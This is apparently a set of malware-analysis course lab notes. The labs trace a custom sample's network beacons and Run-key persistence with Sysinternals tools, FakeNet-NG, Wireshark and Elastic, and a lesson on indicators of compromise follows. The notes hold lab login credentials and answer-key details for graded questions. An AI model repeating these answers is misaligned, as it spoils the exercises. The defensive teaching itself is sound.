NOTE: Usually, the best course of action is to revert a VM to a snapshot and then to run the malware again in another tool. However, because this is custom malware and its actions are already known, the cleanup script is sufficient for this exercise.


Complete the tasks in the following workflow to analyze a malicious file using Procmon and TCPView.


Workflow


1. Open Procmon64. A prompt appears, stating that this file was downloaded from the Internet. Select Run. 


2. A prompt asks for permission to make changes to the device; select Yes. 


3. Drag the Procmon64 window to the side so that the desktop is visible.


4. Run Lab1.exe again from the desktop. Read the pop-up message, and close the window.

<img width="1054" height="320" alt="image" src="https://github.com/user-attachments/assets/26fbf39d-19a4-4f2f-8f63-4a44a2e92b51" />

In Procmon, filter the output so that only Lab1.exe information is displayed. 


5. Select Filter on the menu bar, and select Filter in the resulting menu. In the Process Monitor Filter window that appears, select Process Name in the first drop-down field, enter Lab1.exe as the search term, select Add, and select OK:

<img width="323" height="336" alt="image" src="https://github.com/user-attachments/assets/4ddc9ed5-8931-4824-8c5e-7cd643320a6e" />

<img width="583" height="342" alt="image" src="https://github.com/user-attachments/assets/f45a4fff-5755-425a-adcd-93c74102be88" />



Once the events are filtered to show only a specific process, it is possible to get an idea of what files, connections, or processes the application of interest is accessing.


6. Scroll down the output list, and look for results that show interaction with the registry, file activity, and network connections. Many other filters may also be added to Procmon to clean up the output.  


7. Close Procmon.


8. Open TCPView64 to get a different view on network connections. (Select Yes when prompted to open the application with administrative privileges.)


9. In the TCPView search box, enter Lab1.exe to filter the current network connections of this process:



<img width="1704" height="248" alt="image" src="https://github.com/user-attachments/assets/3bd0dee3-9b96-4295-91bd-474c2ff1e820" />



The output of the tool shows that the application is continuously making connections to a remote address over port 8080. At this time, it is not possible to determine the type of connection or whether there are GET or POST requests with this tool.


10. Close TCPView64. 


11. On the desktop, re-run cleanup.bat as administrator to stop the malware and to clean up its artifacts.


Complete the tasks in the following workflow to analyze a malicious file using FakeNet-NG.


Workflow


1. On the desktop, open FakeNet-NG, which helps collect more information about the network requests. When the prompt to make changes to the device appears, select Yes. 


2. Open Lab1.exe and observe the network results in FakeNet-NG.


Fakenet-NG picks up several requests regarding Lab1.exe:

<img width="1028" height="585" alt="image" src="https://github.com/user-attachments/assets/67007119-ed44-4954-8233-cce8906a6a49" />




3. Close Fakenet-NG, and browse to the fakenet1.4.11 folder (C:\Users\Public\Public Downloads\Tools\fakenet1.4.11). Open the file packets_[currentdate] in Wireshark by double-clicking the file:


<img width="850" height="436" alt="image" src="https://github.com/user-attachments/assets/c9423492-6d7e-400f-8502-cb095380e5d7" />


4. In Wireshark, set the display filter to tcp.port == 8080. This port was seen in FakeNet-NG, but Wireshark provides more details.

<img width="1398" height="382" alt="image" src="https://github.com/user-attachments/assets/db77fd00-b653-4e40-90f8-157a1f6c22c3" />


5. Set the display filter to http.request.method == GET to see only the GET requests:


<img width="829" height="631" alt="image" src="https://github.com/user-attachments/assets/e57037b7-8069-42c1-825f-8b04cfde3f87" />


6. Close Wireshark, and run Autorunsc64.exe from the Desktop within a command prompt. Carefully scroll through the results to see driverupd.exe was added to the Run key. 


There is an issue with Autoruns64.exe that it will not display the recent registry change even after reboot, but Autoruns64.exe (command line) does detect the change.


Autoruns is quite effective in finding persistence objects in conjunction with Procmon.

<img width="687" height="313" alt="image" src="https://github.com/user-attachments/assets/bd675024-799f-4908-acb5-b4c821515b2b" />

7. Close Autoruns, and run cleanup.bat as administrator. 


Use this lab to answer the following questions

<img width="1127" height="593" alt="image" src="https://github.com/user-attachments/assets/6318aee9-ebdb-4e44-b7af-8e98f6a5b688" />

<img width="1116" height="550" alt="image" src="https://github.com/user-attachments/assets/08e7d87e-c490-4061-afcc-aaac59a20a07" />


-------------

Malware Analysis for IOCs
IOCs are clues or artifacts that indicate that a system may have been infiltrated by a cyber threat and how extensive the damage may be. IOCs provide cybersecurity teams with vital data after a security breach. 

﻿

Security teams benefit when analysts gather multiple IOCs and use them to evaluate the details of a possible attack. This information can be used to determine what type of attack took place and, in some cases, who was behind it. It is also beneficial for security teams to document any IOCs to prevent attacks in the future. 

﻿

Common IOCs
﻿

Several types of IOCs exist; some include simple elements, such as metadata, and others are more complex, such as complicated malicious code. Descriptions of the most common IOCs are as follows.

﻿

Unusual Outbound Network Traffic
﻿

Traffic leaving the network is an indicator that analysts can use to identify a potential issue. To steal data or download any additional packages, malware needs to connect with an external host from the compromised system. If outbound traffic patterns are suspicious, such as abnormal connection or data transfer volumes, an analyst can monitor them to determine if the traffic is malicious or not. Traffic that originates from within the network is easier to monitor, and immediate action can stop an attack.

﻿

Other activities that should be monitored are hexadecimal IP addresses (for example, http://0x60D00297) instead of a typical domain name with the format domain.com. Outbound packages should also be monitored for any IP spoofing and cross-referenced with any suspicious IP directories to determine if specific IPs or domains are legitimate.   

﻿

Anomalies in Privileged User Account Activity
﻿

Privileged user accounts typically have access to sensitive areas within a network or applications. If any anomalies are discovered early in an attack, security teams can identify an attack before it causes significant damage. Anomalies to look for are users trying to escalate account privileges without proper approval, users using an account to access other accounts with higher privileges, or users accessing data or applications that are abnormal for that account.

﻿

Geographic Irregularities
﻿

Login attempts from countries with which the organization does not do business can be a sign of a potential cyber attack. This is usually evidence that an attacker from another country is trying to get into a system or already has accessed it. 

﻿

Account Login Irregularities
﻿

Legitimate users are typically successful at logging in to account within three attempts. Attempts to log in many times or at an unusual time of day are signs that an attacker may be trying to access the system. Failed login attempts for nonexistent accounts are evidence that an attacker may be attempting to guess the login credentials for a system to obtain access to that system.

﻿

Surge of Database Read Volume
﻿

An attacker’s attempt to exfiltrate data can result in a large increase in the read volume for data in a database. This can occur as the attacker gathers the data in an attempt to extract it.

﻿

Hypertext Markup Language Response Sizes
﻿

If the typical Hypertext Markup Language (HTML) response size is relatively small for an organization but larger-than-usual HTTP responses (the data coming back from the server being requested) are occurring, this is an indicator that data has been exfiltrated. For example, requesting the web page Google.com results in a server response that provides the web page, which is relatively small in size. If malware makes a web request to download a file, the response is likely significantly larger in size than a basic web page request. Typically, C2 servers also request frequent check-ins with the infected machine and are all the same size in each request. This can help identify malicious behavior and could be used to create a signature to detect malicious activity in the future. A mass exodus of data results in large HTML response sizes as the data is transmitted to the attacker.

﻿

Large Number of Requests for the Same File
﻿

Attackers often try to access specific files that they are attempting to steal. If specific files are requested multiple times by the same person or by an unusual account, this may indicate that an attacker is attempting to access that file. 

﻿

Unusual Network and File SystemTraffic
﻿

Suspicious or unfamiliar new network or file system objects can be clear IOCs. Common file extensions that attackers use with malware include .exe, .dll, and .bat. However, any type of executable, library, or configuration file can be used by attackers for malware to impersonate a legitimate file.

﻿

Applications often use ports to exchange data with a network. Attackers can use unusual ports to penetrate the network through an application or to affect a specific application. They also use C2 servers to compromise a network with malware. The server sends a command to execute malware, steal data, or interrupt services. An anomalous DNS request, particularly if it comes from a certain host, is an IOC. 

﻿

Establishing a network or file system baseline can make such changes easier to spot by an analyst.    

﻿

Summary of IOCs 
﻿

The following summarizes the IOCs to look for when gauging whether a suspicious activity has occurred:

Unusual traffic patterns between internal systems.
Unusual usage patterns for privileged accounts.
Administrative access to a network from an irregular geographic location.
Suspicious IP addresses or hostnames.
URLs or domain names of botnets.
Known MD5 hashes of malicious files.
Virus signatures of known malware.
Windows registry entries that are unfamiliar.
Unfamiliar network processes or services. 
Unauthorized configuration changes to files, servers, or systems.
Common Tactics, Techniques, and Procedures Associated with Malware
﻿

Most modern malware uses a combination of Tactics, Techniques, and Procedures (TTPs) to hide its operations, stage exploits, evade detection, and leverage network weaknesses. Using the MITRE ATT&CK® framework, analysts can map some of the common IOCs to specific TTPs to further analyze potential malware on a system and the goals an attacker may want to achieve when targeting an organization. 

﻿

Execution (TA002)
﻿

The Execution tactic consists of techniques that result in attacker-controlled malware running on a local or remote system. These techniques are often paired with techniques from other tactics to create a sophisticated attack and achieve the attacker’s goals, whether that is stealing data or performing reconnaissance on a network. An example of a common malware technique that attackers use for Execution is as follows:   

﻿

User Execution of a Malicious File, Subtechnique T1204.002﻿

﻿

An adversary relies on a user to execute a malicious program via a file that was sent to or downloaded by the victim. The file format is often .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, or .cpl, and the file may be named in a way to garner the attention of the victim.

﻿

Detection of Execution TTPs﻿

﻿

An analyst can see which files were recently accessed through Sysmon and which processes were responsible for starting them. This provides the analyst an understanding of the execution flow of that specific piece of malware. Any attachments recently opened from an email and files opened using their usual default program but spawning an executable can be used as IOCs to track this activity.

﻿

Persistence (TA0003)
﻿

With the Persistence tactic, an attacker attempts to maintain their foothold on a target to continue their presence in a system or network. This tactic consists of techniques to keep the attacker present on systems across restarts, changed user credentials, and other interruptions that could cut off their access to the system. Techniques for this tactic include such methods as replacing or hijacking legitimate code with attacker-controlled code or by adding code to the startup of a system. Two examples of techniques that attackers use to achieve persistence are as follows: 

﻿

Registry Run Keys/Startup Folder, Subtechnique T1547.001﻿

﻿

Malware can create registry keys in the HKLM\Software\Microsoft\Windows\CurrentVersion\Run area of the registry or add files to the C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup directory for persistence. 

﻿

Create Local Account, Subtechnique T1136.001﻿

﻿

Malware may be programmed to create new user accounts that have administrative privileges enabling an attacker to access the system under that new account. Newly created accounts may not always be created with administrative privileges, however, because new accounts with administrative privileges are easier for analysts to spot. Creative attackers use low-level accounts and then implement privilege escalation techniques. 

﻿

Detection of Persistence TTPs﻿

﻿

To detect persistence on a Windows system, analysts should check native Windows logs and Sysmon events to find new scheduled tasks or recently created services. Hunting in persistence locations for anomalies and outliers is a great way to find an attacker. Specifically, the name of the malicious binary and the name of the key added to the registry can be used as IOCs to search other hosts for this activity. Using Autoruns to detect programs that attackers are using during startup is also a good way to detect persistence methods that attackers are using. 

﻿

Defense Evasion (TA0005)
﻿

Defense Evasion consists of an attacker’s attempt to avoid detection. Defense Evasion techniques include uninstalling or disabling security software, such as an antivirus solution, or obfuscating or encrypting data and scripts. Attackers also leverage and abuse trusted system processes to hide malware. They also combine other tactics, to include the added benefit of evading defenses when creating malware.  

﻿

Disable or Modify Tools, Subtechnique T1562.001﻿

﻿

Attackers may modify or disable antivirus software or other Endpoint Detection and Response (EDR) agents running on the system.

﻿

Disable Windows Event Logging, Subtechnique T1562.002﻿

﻿

Attackers may turn off the Windows Event Logs so that defenders do not have logs to investigate to uncover the actions taken on a host.

﻿

Detection of Defense Evasion TTPs﻿

﻿

The Windows Event Logs, specifically the System Log , contains  information about running services. If an attacker could disable the Event Log service or stop Windows Defender, there would still be a log for these events. Event Identifier (ID) 1102 is the ID to look for when the Security Log is cleared, and event ID 7036 shows when services are stopped. Event ID 104 in the System Log appears if the System or Application Logs are cleared. Also, tools like Sysmon should be able to see the command-line arguments used by a malicious program that can be used as IOCs to track this activity.



--------------


Investigate a System for IOCs
Read the following scenario: 

﻿

An analyst needed a newer version of an antivirus program to scan hosts in the network. Funding was not available for the program of choice, and the analyst downloaded what appeared to be an unlocked version of the desired antivirus program from the product website: 


<img width="1168" height="440" alt="image" src="https://github.com/user-attachments/assets/3da6cdfb-dc2e-4ead-a0ce-dac64d3136a8" />

In the following lab, using the skills and knowledge gained in this lesson, investigate the host machine for malware. The goal of the lab is to discover multiple IOCs. In a real scenario, these collected IOCs would be used to quickly search an environment to determine if other hosts were affected.


Items of interest include the following:

Hash of the downloaded file and the file created by the malware. Used to quickly find other hosts or to block that file from running in the environment, depending on what EDR tools are available.
Persistence used. Used to find other hosts if the hashes have been changed.
Network activity. Used to block that IP and port or identify hosts communicating with that IP to indicate they are also compromised.

Any of the following tools that were covered in the first lab of this lesson may be used:
Sysmon (event IDs 1, 11, 13, and 15)
Regshot
Sysinternals tools (Procmon, TCPView, Autoruns)
FakeNet-NG/Wireshark (http.request.method == GET OR tcp.port == 8080)

Workflow


1. Log in to the VM win-hunt using the following credentials: 
Username: trainee
Password: CyberTraining1!



2. To analyze Sysmon events, open Chrome and select the Discover - Elastic bookmark.


3. When the warning Your connection is not private appears, select Advanced, and select Proceed to 199.63.64.92 (unsafe). 


4. Log in to Elastic using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!



5. Set the Kibana filter dates as Aug 2, 2022 @ 09:23:15.000 to Aug 2, 2022 @ 09:25:00.000.


6. Set the search filter to view a single host and to remove noisy logs that are not important for this investigation, as follows:
agent.name:"bp-wkstn-1" and not (message:"*find.exe" or message:"*NETSTAT.exe")


7. Once malicious files are located, one method to obtain the hash is to right-click on the file and select Md5 Hash:


<img width="329" height="188" alt="image" src="https://github.com/user-attachments/assets/2a31abad-c71a-4096-b801-4bf2e9ff07d2" />

After the malicious files are located, answer the following questions

<img width="1091" height="602" alt="image" src="https://github.com/user-attachments/assets/39e1b6cb-666f-48b2-bed7-fd3b926b16d1" />

<img width="1111" height="623" alt="image" src="https://github.com/user-attachments/assets/140fa9ec-bf7f-41b3-8fe3-3003b7385739" />
<img width="1076" height="658" alt="image" src="https://github.com/user-attachments/assets/c63c9fe4-2f5d-43c2-b7c6-31b98eb131bf" />


-----------------

Explanation
﻿﻿Once Lab1.exe is started, the answer to the prior question may be found directly by using TCPView or Process Monitor.

﻿

In TCPView, sort the output by Process Name. This shows results similar to Figure 23.2-14:


<img width="902" height="152" alt="image" src="https://github.com/user-attachments/assets/0d1db150-106e-4c45-a6ce-f14605767254" />


In Process Monitor, create a Process Monitor Filter, as illustrated in Figure 23.2-15. 
The filter should use Process Name, contains, and Lab1.
Select Add to add the filter.
Select Apply to close the window.


<img width="587" height="356" alt="image" src="https://github.com/user-attachments/assets/fb303140-a5c8-45b7-8bf3-ac819ed5813f" />

Once the filter is applied, the output displays information similar to Figure 23.2-16:

<img width="613" height="136" alt="image" src="https://github.com/user-attachments/assets/31382198-bb65-466b-9ea6-62d42596fd1e" />

The full computer name is cda-win-hunt, the local IP address is 199.63.64.31, and the port number used by Lab1.exe is 8080. 


--------------------











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































